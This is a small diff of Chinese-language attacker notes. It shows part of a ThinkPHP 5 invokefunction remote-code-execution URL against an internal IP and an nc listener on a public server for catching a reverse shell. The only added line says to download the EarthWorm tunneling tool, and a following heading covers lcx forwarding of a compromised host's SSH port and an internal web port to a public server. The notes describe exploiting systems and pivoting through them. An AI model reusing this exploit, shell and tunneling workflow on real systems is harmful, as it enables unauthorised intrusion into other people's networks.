@@ -38,7 +38,7 @@ http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&func
 
 公网服务器上面监听：
 nc -l -p 1235
-
+下载ew
 
 ## 使用lcx相关的功能
 ### 将肉鸡的22端口或者内网中的10.203.87.61的80端口转发到公网上8888端口
